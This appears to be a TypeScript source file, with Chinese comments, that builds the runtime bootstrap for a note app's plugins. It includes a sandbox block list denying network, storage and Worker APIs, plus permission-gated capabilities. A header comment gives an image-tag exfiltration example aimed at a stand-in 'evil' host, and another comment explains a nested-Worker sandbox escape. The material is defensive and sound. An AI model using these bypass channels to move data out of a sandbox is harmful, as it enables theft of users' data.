import type { PluginPermission } from './types'

/**
 * createWorkerSource 生成插件运行时引导代码。
 *
 * 函数名带 Worker，但它同时服务于两种执行模式：
 *
 * - `trusted=false`（默认，sandbox）：跑在 Web Worker 里，网络、本地存储、
 *   嵌套 Worker 全部禁用，插件只能使用 manifest 声明过的能力；
 * - `trusted=true`（full-trust）：跑在主进程上下文，不禁用任何浏览器能力。
 *   这一层的管控交给 CSP 的 connect-src / img-src（见 internal/security/csp.go）——
 *   因为光禁 fetch 挡不住 `<img src="http://evil/?d=...">` 这类旁路外传。
 *
 * 两种模式共用同一套消息协议（通过 scope 上的 postMessage / addEventListener 通信），
 * 因此上层 PluginRuntimeHost 不需要区分插件跑在哪。
 */
export function createWorkerSource(
  pluginId: string,
  permissions: PluginPermission[],
  trusted = false,
): string {
  const identity = JSON.stringify(pluginId)
  const allowedPermissions = JSON.stringify([...permissions])

  // 只有沙箱模式才生成禁用逻辑。刻意不在受信任模式下生成「包在 if 里的死代码」——
  // 那种写法留了可被绕过的结构，直接不生成更干净也更好审。
  //
  // 注意：所有禁用项统一走一个循环，不要分散成多处 try/catch。
  // 之前 localStorage / indexedDB 是单独写的，重命名 helper 时漏改了这两处，
  // 导致 getter 引用了未定义标识符、异常被 catch 吞掉——结果就是「看起来禁了其实没禁」。
  const sandboxBlock = trusted ? '' : `
  const denyBlocked = () => {
    throw new Error('network, storage and nested-worker APIs are disabled in plugin sandbox')
  }
  const blocked = [
    // 网络与外传通道
    'fetch',
    'XMLHttpRequest',
    'WebSocket',
    'EventSource',
    'sendBeacon',
    // 动态加载外部脚本
    'importScripts',
    // 嵌套 Worker —— 关键：内层 Worker 是一个全新的全局作用域，
    // 不会继承本沙箱对这些属性的改写（fetch / importScripts 都可用），
    // 因此 new Worker(blobUrl) 是一条现成的逃逸路径，必须一并禁掉。
    'Worker',
    'SharedWorker',
    // 本地存储：既能持久化数据，也能当作跨会话的侧信道
    'localStorage',
    'sessionStorage',
    'indexedDB',
  ]
  const deny = { configurable: true, get: denyBlocked }
  for (const name of blocked) {
    try { Object.defineProperty(scope, name, deny) } catch (_error) {}
  }`

  return `(() => {
  const scope = typeof self !== 'undefined' ? self : globalThis
  const pluginId = ${identity}
  const permissions = new Set(${allowedPermissions})
${sandboxBlock}
  let requestCount = 0
  const pendingCapabilities = new Map()
  const registeredCommands = new Map()
  // 生命周期回调（#26）。此前插件只能在顶层直接注册命令，没有任何清理时机：
  // 禁用插件时宿主直接 terminate，插件没机会注销监听器或保存状态。
  const loadHandlers = []
  const unloadHandlers = []
  // 工作区事件回调（#27）。没有它插件做不了任何自动化：
  // 模板触发、每日自动建笔记这类需求全部依赖「感知文件变更」。
  const eventHandlers = []
  // 设置变更回调（#29）
  const settingsChangeHandlers = []
  // 工具栏按钮点击回调（P14），按 buttonId 索引
  const toolbarClickHandlers = new Map()

  function send(message) {
    scope.postMessage({ ...message, id: pluginId, pluginId })
  }

  const notevault = Object.freeze({
    readFile(path) {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('workspace.read', { path: String(path || '') })
    },
    registerCommand(command) {
      if (!permissions.has('commands')) {
        // 缺权限时只记错不抛。否则 plugin:start 阶段就整体失败，
        // 整插件被标记为 failed，连带其他命令、按钮、装饰全挂掉
        send({ type: 'plugin:error', error: 'commands permission is required' })
        return
      }
      if (!command || typeof command.id !== 'string' || !command.id.trim()) {
        throw new Error('command id is required')
      }
      if (typeof command.label !== 'string' || !command.label.trim()) {
        throw new Error('command label is required')
      }
      if (typeof command.run !== 'function') {
        throw new Error('command run handler is required')
      }
      if (registeredCommands.has(command.id)) {
        throw new Error(\`duplicate command id: \${command.id}\`)
      }
      registeredCommands.set(command.id, command.run)
      send({
        type: 'plugin:command-register',
        command: {
          description: typeof command.description === 'string' ? command.description : '',
          id: command.id,
          label: command.label,
        },
      })
    },
    notify(message) {
      if (!permissions.has('notifications')) {
        throw new Error('notifications permission is required')
      }
      send({ type: 'plugin:notification', message: String(message ?? '') })
    },

    // ---- 生命周期（#26）----
    // 不需要额外权限：注册回调本身没有副作用，能做什么是各 API 自己的权限说了算。
    onLoad(handler) {
      if (typeof handler !== 'function') throw new Error('onload handler must be a function')
      loadHandlers.push(handler)
    },
    onUnload(handler) {
      if (typeof handler !== 'function') throw new Error('onunload handler must be a function')
      unloadHandlers.push(handler)
    },

    // ---- 工作区事件（#27）----
    // 事件里带文件路径，所以需要 workspace.read——
    // 没有读权限的插件不该拿到整个库的结构信息。
    onFileChange(handler) {
      if (!permissions.has('workspace.read')) {
        throw new Error('workspace.read permission is required')
      }
      if (typeof handler !== 'function') throw new Error('event handler must be a function')
      eventHandlers.push(handler)
    },

    // ---- 插件设置（#29）----
    // 声明式协议：插件描述设置项，宿主渲染界面，
    // 用户改动后宿主把整份值回传给插件，由插件自己持久化（配合 loadData/saveData）。
    registerSettings(schema) {
      if (!schema || !Array.isArray(schema.items)) {
        throw new Error('settings schema must define an items array')
      }
      const items = schema.items.filter(item => item && typeof item.key === 'string'
        && typeof item.label === 'string').map(item => ({
          default: item.default,
          description: typeof item.description === 'string' ? item.description : undefined,
          key: item.key,
          label: item.label,
          // 只放行宿主认识的类型，避免渲染出意料之外的控件
          type: item.type === 'toggle' || item.type === 'number' ? item.type : 'text',
        }))
      send({
        settings: {
          items,
          title: typeof schema.title === 'string' ? schema.title : '',
          values: schema.values && typeof schema.values === 'object' ? schema.values : {},
        },
        type: 'plugin:settings-register',
      })
    },
    onSettingsChange(handler) {
      if (typeof handler !== 'function') {
        throw new Error('settings change handler must be a function')
      }
      settingsChangeHandlers.push(handler)
    },

    // ---- 声明式编辑器扩展（P14）----
    // 这里只做基本类型检查。真正的白名单校验在宿主侧——
    // 消息来自插件，宿主绝不能相信它传来的任何字段。
    registerDecoration(decoration) {
      if (!permissions.has('editor.decorate')) {
        // 缺权限时只记错不抛，避免 plugin:start 整体失败——
        // 详见 registerCommand 的注释，同一套取舍
        send({ type: 'plugin:error', error: 'editor.decorate permission is required' })
        return
      }
      if (!decoration || typeof decoration.pattern !== 'string' || !decoration.pattern) {
        throw new Error('decoration pattern is required')
      }
      send({
        decoration: {
          class: typeof decoration.class === 'string' ? decoration.class : undefined,
          flags: typeof decoration.flags === 'string' ? decoration.flags : undefined,
          id: String(decoration.id ?? ''),
          pattern: decoration.pattern,
          regex: decoration.regex === true,
          scope: decoration.scope === 'line' ? 'line' : 'match',
          style: decoration.style && typeof decoration.style === 'object' ? decoration.style : undefined,
        },
        type: 'plugin:decoration-register',
      })
    },
    registerWidget(widget) {
      if (!permissions.has('editor.decorate')) {
        // 缺权限时只记错不抛，避免 plugin:start 整体失败——
        // 详见 registerCommand 的注释，同一套取舍
        send({ type: 'plugin:error', error: 'editor.decorate permission is required' })
        return
      }
      if (!widget || typeof widget.pattern !== 'string' || !widget.pattern) {
        throw new Error('widget pattern is required')
      }
      send({
        type: 'plugin:widget-register',
        widget: {
          class: typeof widget.class === 'string' ? widget.class : undefined,
          flags: typeof widget.flags === 'string' ? widget.flags : undefined,
          id: String(widget.id ?? ''),
          pattern: widget.pattern,
          regex: widget.regex === true,
          text: String(widget.text ?? ''),
        },
      })
    },
    registerKeymap(binding) {
      if (!permissions.has('editor.decorate')) {
        // 缺权限时只记错不抛，避免 plugin:start 整体失败——
        // 详见 registerCommand 的注释，同一套取舍
        send({ type: 'plugin:error', error: 'editor.decorate permission is required' })
        return
      }
      if (!binding || typeof binding.key !== 'string' || !binding.key) {
        throw new Error('keymap key is required')
      }
      if (typeof binding.command !== 'string' || !binding.command) {
        throw new Error('keymap command is required')
      }
      send({
        keymap: {
          command: binding.command,
          id: String(binding.id ?? ''),
          key: binding.key,
        },
        type: 'plugin:keymap-register',
      })
    },

    // ---- 编辑器选区读写（P14）----
    // 插件在沙箱里拿不到 DOM，读写选区只能委托宿主在真实编辑器上执行。
    // 需要 ui 权限：这是在改动用户正在编辑的内容。
    getSelection() {
      if (!permissions.has('ui')) {
        return Promise.reject(new Error('ui permission is required'))
      }
      return requestCapability('editor.selection', {})
    },
    replaceSelection(text) {
      if (!permissions.has('ui')) {
        return Promise.reject(new Error('ui permission is required'))
      }
      return requestCapability('editor.replace', { text: String(text ?? '') })
    },

    // ---- 插件私有数据（#29）----
    // 不需要 workspace 权限：数据按插件 ID 隔离，插件只能读写自己的那一份。
    // 没有它插件就完全无状态——设置项、缓存、运行记录都存不下来。
    loadData() {
      return requestCapability('plugin.data.load', {})
    },
    saveData(data) {
      return requestCapability('plugin.data.save', { data: String(data ?? '') })
    },
    writeFile(path, content) {
      if (!permissions.has('workspace.write')) {
        return Promise.reject(new Error('workspace.write permission is required'))
      }
      return requestCapability('workspace.write', {
        content: String(content ?? ''),
        path: String(path || ''),
      })
    },

    // ---- 文件、目录、元数据与检索 ----
    // 这些能力后端其实早就有了（FileService / TagService / TodoService /
    // GraphService / SearchService），这里只是把它们桥接给插件。
    // 补齐后插件才能遍历笔记、查标签与反向链接，进而做出 Dataview 那类东西。

    listFiles() {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('workspace.list', {})
    },
    createFile(path, content) {
      if (!permissions.has('workspace.write')) {
        return Promise.reject(new Error('workspace.write permission is required'))
      }
      return requestCapability('workspace.create', {
        content: String(content ?? ''),
        path: String(path || ''),
      })
    },
    deleteFile(path) {
      if (!permissions.has('workspace.write')) {
        return Promise.reject(new Error('workspace.write permission is required'))
      }
      return requestCapability('workspace.delete', { path: String(path || '') })
    },
    renameFile(path, newName) {
      if (!permissions.has('workspace.write')) {
        return Promise.reject(new Error('workspace.write permission is required'))
      }
      return requestCapability('workspace.rename', {
        newName: String(newName || ''),
        path: String(path || ''),
      })
    },
    getAllTags() {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('tags.all', {})
    },
    getFilesByTag(tag) {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('tags.files', { tag: String(tag || '') })
    },
    getAllTodos() {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('todos.all', {})
    },
    getBacklinks(path) {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('graph.backlinks', { path: String(path || '') })
    },
    search(query) {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('search.query', { query: String(query || '') })
    },
    getFrontmatter(path) {
      if (!permissions.has('workspace.read')) {
        return Promise.reject(new Error('workspace.read permission is required'))
      }
      return requestCapability('meta.frontmatter', { path: String(path || '') })
    },

    registerToolbarButton(button) {
      if (!permissions.has('ui')) {
        // 缺权限时只记错不抛，避免 plugin:start 整体失败——
        // 详见 registerCommand 的注释，同一套取舍
        send({ type: 'plugin:error', error: 'ui permission is required' })
        return
      }
      if (!button || typeof button.id !== 'string' || !button.id.trim()) {
        throw new Error('toolbar button id is required')
      }
      if (typeof button.title !== 'string' || !button.title.trim()) {
        throw new Error('toolbar button title is required')
      }
      const transform = button.transform && typeof button.transform === 'object'
        ? {
            insert: typeof button.transform.insert === 'string' ? button.transform.insert : undefined,
            linePrefix: typeof button.transform.linePrefix === 'string'
              ? button.transform.linePrefix
              : undefined,
            placeholder: typeof button.transform.placeholder === 'string' ? button.transform.placeholder : undefined,
            prefix: typeof button.transform.prefix === 'string' ? button.transform.prefix : undefined,
            suffix: typeof button.transform.suffix === 'string' ? button.transform.suffix : undefined,
          }
        : undefined
      // 三种点击行为，按优先级：command（宿主内置命令）> transform（文本变换）
      // > handledByPlugin（插件自己异步处理，配合 onToolbarClick）
      const command = typeof button.command === 'string' && button.command
        ? button.command
        : undefined
      const handledByPlugin = !command && !transform && button.handledByPlugin === true
      send({
        button: {
          command,
          handledByPlugin: handledByPlugin || undefined,
          icon: typeof button.icon === 'string' ? button.icon : undefined,
          id: button.id,
          title: button.title,
          tooltip: typeof button.tooltip === 'string' ? button.tooltip : undefined,
          transform,
        },
        type: 'plugin:toolbar-register',
      })
    },
    // 由插件异步处理按钮点击：读选区 → 计算 → 写回。
    // 适合「排序行 / 全角半角转换」这类需要拿到文本才能决定的操作，
    // 宿主不必为每一种处理都内置一个命令。
    onToolbarClick(buttonId, handler) {
      if (!permissions.has('ui')) {
        throw new Error('ui permission is required')
      }
      if (typeof buttonId !== 'string' || !buttonId) {
        throw new Error('button id is required')
      }
      if (typeof handler !== 'function') {
        throw new Error('toolbar click handler must be a function')
      }
      toolbarClickHandlers.set(buttonId, handler)
    },
  })
  try {
    Object.defineProperty(scope, 'notevault', {
      configurable: false,
      enumerable: true,
      value: notevault,
      writable: false,
    })
  } catch (_error) {}

  function requestCapability(method, args) {
    requestCount += 1
    const requestId = \`\${pluginId}:\${requestCount}\`
    return new Promise((resolve, reject) => {
      pendingCapabilities.set(String(requestId), { reject, resolve })
      send({
        args: { ...args, requestId },
        method,
        type: 'plugin:capability-request',
      })
    })
  }

  scope.addEventListener('message', (event) => {
    const data = event.data || {}
    if (!data.type || data.id !== pluginId && !data.requestId) return

    if (data.type === 'plugin:start') {
      try {
        const bootstrap = new Function('notevault', String(data.source || ''))
        const exported = bootstrap(notevault)
        // 兼容「返回一个 { onload, onunload } 对象」的写法，
        // 与 notevault.onLoad/onUnload 二选一即可，同时用也行（按注册顺序执行）。
        // 注意必须显式 return —— new Function 不会自动返回最后一个表达式。
        if (exported && typeof exported === 'object') {
          if (typeof exported.onload === 'function') loadHandlers.push(exported.onload)
          if (typeof exported.onunload === 'function') unloadHandlers.push(exported.onunload)
        }
        for (const handler of loadHandlers) { handler(notevault) }
        send({ type: 'plugin:ready' })
      } catch (error) {
        send({ type: 'plugin:error', error: error instanceof Error ? error.message : String(error) })
      }
      return
    }

    if (data.type === 'plugin:event') {
      // 与 unload 同理：某个订阅者抛错不能影响其他订阅者
      for (const handler of eventHandlers) {
        try { handler(data.event) } catch (_error) {}
      }
      return
    }

    if (data.type === 'plugin:toolbar-click') {
      const handler = toolbarClickHandlers.get(String(data.buttonId || ''))
      if (handler) {
        Promise.resolve()
          .then(() => handler())
          .catch(_error => {})
      }
      return
    }

    if (data.type === 'plugin:settings-change') {
      for (const handler of settingsChangeHandlers) {
        try { handler(data.values || {}) } catch (_error) {}
      }
      return
    }

    if (data.type === 'plugin:unload') {
      // 某个回调抛错也要继续跑完其余的，否则会漏掉后面的资源清理
      for (const handler of unloadHandlers) {
        try { handler() } catch (_error) {}
      }
      loadHandlers.length = 0
      unloadHandlers.length = 0
      send({ type: 'plugin:unloaded' })
      return
    }

    if (data.type === 'plugin:capability-response') {
      const pending = pendingCapabilities.get(String(data.requestId))
      if (!pending) return
      pendingCapabilities.delete(String(data.requestId))
      if (data.ok) pending.resolve(data.value)
      else pending.reject(new Error(data.error || 'capability request failed'))
      return
    }

    if (data.type === 'plugin:command-run') {
      const run = registeredCommands.get(String(data.commandId || ''))
      if (!run) {
        send({
          error: \`command does not exist: \${String(data.commandId || '')}\`,
          status: 'failed',
          type: 'plugin:command-result',
        })
        return
      }
      // 刻意写成 Promise.resolve().then(() => run(...)) 而不是 Promise.resolve(run(...))：
      // 后者会在「参数求值」阶段就把同步抛出的异常丢出来，异常直接逃逸出 Promise 链——
      // 宿主收不到 command-result，命令会一直挂到超时。
      // Worker 模式下好歹还有 error 事件兜底，主进程模式下就是一个未捕获异常。
      Promise.resolve()
        .then(() => run(data.args || {}))
        .then(() => {
          send({ status: 'completed', type: 'plugin:command-result' })
        })
        .catch((error) => {
          send({
            error: error instanceof Error ? error.message : String(error),
            status: 'failed',
            type: 'plugin:command-result',
          })
        })
    }
  })

  scope.addEventListener('error', () => {
    send({ error: 'uncaught worker error', type: 'plugin:error' })
  })
})()`
}
